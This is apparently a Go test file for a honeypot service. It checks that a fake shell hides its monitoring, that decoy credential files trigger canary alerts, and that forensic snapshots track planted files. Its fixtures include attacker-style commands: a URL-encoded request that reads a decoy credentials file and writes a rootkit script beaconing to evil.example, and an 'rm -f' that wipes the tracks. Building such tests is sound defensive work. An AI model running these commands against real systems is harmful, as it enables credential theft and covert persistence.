// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestHoneypotRootfsDropAndForensicTrail(t *testing.T) {
	hp, err := newHoneypot(t.TempDir())
	if err != nil {
		t.Fatalf("newHoneypot: %v", err)
	}

	resp, err := hp.Interact("backdoor.sh", "#!/bin/sh\necho pwned", "echo hello_gvisor", "10.0.0.12")
	if err != nil {
		t.Fatalf("Interact: %v", err)
	}

	files := resp["files_in_rootfs_tmp"].(map[string]string)
	if files["backdoor.sh"] != "#!/bin/sh\necho pwned" {
		t.Fatalf("expected backdoor.sh in rootfs tmp, got %v", files)
	}
	if _, ok := files["payroll_db_credentials.env.bak"]; !ok {
		t.Fatalf("expected decoy credentials file to exist")
	}
	if _, ok := files["wire_transfer_batch_409.csv"]; !ok {
		t.Fatalf("expected decoy wire transfer file to exist")
	}

	stdout, _ := resp["stdout"].(string)
	if !strings.Contains(stdout, "hello_gvisor") {
		t.Fatalf("expected real shell stdout 'hello_gvisor', got %q", stdout)
	}

	events := resp["forensic_audit_trail"].([]ForensicEvent)
	if len(events) != 2 {
		t.Fatalf("expected 2 forensic events, got %d", len(events))
	}
}

func TestHoneypotShellVsForensicsSeparationAndRootfsDelta(t *testing.T) {
	hp, err := newHoneypot(t.TempDir())
	if err != nil {
		t.Fatalf("newHoneypot: %v", err)
	}
	mux := newMux(hp)

	// 1. Attacker hits /shell to exfiltrate credentials and plant rootkit.sh
	req1 := httptest.NewRequest(http.MethodGet, "/shell?cmd=cat+payroll_db_credentials.env.bak+%26%26+printf+'%23!/bin/sh%0Acurl+evil.example/beacon%0A'+>+rootkit.sh+%26%26+chmod+%2Bx+rootkit.sh", nil)
	rec1 := httptest.NewRecorder()
	mux.ServeHTTP(rec1, req1)
	if rec1.Code != http.StatusOK {
		t.Fatalf("GET /shell status = %d, body = %s", rec1.Code, rec1.Body.String())
	}

	bodyStr := rec1.Body.String()
	if strings.Contains(strings.ToLower(bodyStr), "honeypot") || strings.Contains(bodyStr, "forensic_audit_trail") {
		t.Fatalf("/shell leaked honeypot/forensic indicators to attacker: %s", bodyStr)
	}

	var shellResp AttackerShellResponse
	if err := json.Unmarshal(rec1.Body.Bytes(), &shellResp); err != nil {
		t.Fatalf("unmarshal /shell: %v", err)
	}
	if !strings.Contains(shellResp.Stdout, "Summer2026!Decoy") {
		t.Fatalf("expected decoy password in stdout, got %q", shellResp.Stdout)
	}

	// 2. SOC queries /forensics and sees ADDED rootkit.sh + CRITICAL Canary alert
	req2 := httptest.NewRequest(http.MethodGet, "/forensics", nil)
	rec2 := httptest.NewRecorder()
	mux.ServeHTTP(rec2, req2)
	if rec2.Code != http.StatusOK {
		t.Fatalf("GET /forensics status = %d", rec2.Code)
	}

	var forensics1 ForensicsResponse
	if err := json.Unmarshal(rec2.Body.Bytes(), &forensics1); err != nil {
		t.Fatalf("unmarshal /forensics: %v", err)
	}
	if len(forensics1.CanaryAlerts) < 2 {
		t.Fatalf("expected at least 2 canary alerts (cred exfil + payload planted), got %+v", forensics1.CanaryAlerts)
	}

	foundAdded := false
	for _, d := range forensics1.RootfsDelta {
		if d.Name == "rootkit.sh" && d.Status == "ADDED" {
			foundAdded = true
		}
	}
	if !foundAdded {
		t.Fatalf("expected rootkit.sh with status ADDED in rootfs_delta, got %+v", forensics1.RootfsDelta)
	}

	// 3. Attacker wipes tracks (rm -f rootkit.sh) -> /forensics reports rootkit.sh as DELETED
	req3 := httptest.NewRequest(http.MethodGet, "/shell?cmd=rm+-f+rootkit.sh", nil)
	rec3 := httptest.NewRecorder()
	mux.ServeHTTP(rec3, req3)

	req4 := httptest.NewRequest(http.MethodGet, "/forensics", nil)
	rec4 := httptest.NewRecorder()
	mux.ServeHTTP(rec4, req4)

	var forensics2 ForensicsResponse
	if err := json.Unmarshal(rec4.Body.Bytes(), &forensics2); err != nil {
		t.Fatalf("unmarshal /forensics after rm: %v", err)
	}
	foundDeleted := false
	for _, d := range forensics2.RootfsDelta {
		if d.Name == "rootkit.sh" && d.Status == "DELETED" {
			foundDeleted = true
		}
	}
	if !foundDeleted {
		t.Fatalf("expected rootkit.sh with status DELETED after rm -f, got %+v", forensics2.RootfsDelta)
	}
}

func TestHoneypotBackendLifecycleRevertAndClone(t *testing.T) {
	ctx := t.Context()
	backend := NewLocalSimulatorBackend("anything-but-agents", "honeypot")

	actorA := "honeypot-203-0-113-5"
	if err := backend.EnsureActor(ctx, actorA); err != nil {
		t.Fatalf("EnsureActor: %v", err)
	}

	// Plant rootkit.sh and save snapshot v2
	_, forensics, err := backend.ExecShell(ctx, actorA, "printf '#!/bin/sh\necho beacon\n' > rootkit.sh && chmod +x rootkit.sh", "", "")
	if err != nil {
		t.Fatalf("ExecShell plant: %v", err)
	}
	if _, ok := forensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
		t.Fatalf("expected rootkit.sh on disk after plant")
	}

	ver, err := backend.SaveActor(ctx, actorA, "Auto-Checkpoint: rootkit.sh planted")
	if err != nil {
		t.Fatalf("SaveActor: %v", err)
	}
	if ver < 2 {
		t.Fatalf("expected snapshot version >= 2, got %d", ver)
	}

	// Clone actorA into honeypot-forensic-lab before wipe
	clonedForensics, err := backend.CloneActor(ctx, actorA, "honeypot-forensic-lab", "tag-forensic-203")
	if err != nil {
		t.Fatalf("CloneActor: %v", err)
	}
	if _, ok := clonedForensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
		t.Fatalf("expected cloned forensic lab actor to contain rootkit.sh")
	}

	// Attacker wipes rootkit.sh on actorA
	_, wipedForensics, err := backend.ExecShell(ctx, actorA, "rm -f rootkit.sh", "", "")
	if err != nil {
		t.Fatalf("ExecShell wipe: %v", err)
	}
	if _, ok := wipedForensics.FilesInRootfsTmp["rootkit.sh"]; ok {
		t.Fatalf("expected rootkit.sh to be deleted after rm -f")
	}

	// Revert actorA back to saved checkpoint -> rootkit.sh is restored!
	revertedForensics, err := backend.RevertActor(ctx, actorA, ver)
	if err != nil {
		t.Fatalf("RevertActor: %v", err)
	}
	if _, ok := revertedForensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
		t.Fatalf("expected rootkit.sh to be restored after RevertActor, got %v", revertedForensics.FilesInRootfsTmp)
	}

	// Suspend actorA and wake it up via ExecShell -> verify worker pod IP migration
	if err := backend.SuspendActor(ctx, actorA); err != nil {
		t.Fatalf("SuspendActor: %v", err)
	}
	_, migratedForensics, err := backend.ExecShell(ctx, actorA, "ls -la", "", "")
	if err != nil {
		t.Fatalf("ExecShell after suspend: %v", err)
	}
	if len(migratedForensics.PodIPHistory) < 2 {
		t.Fatalf("expected PodIPHistory length >= 2 after suspend + wakeup migration, got %v", migratedForensics.PodIPHistory)
	}
}
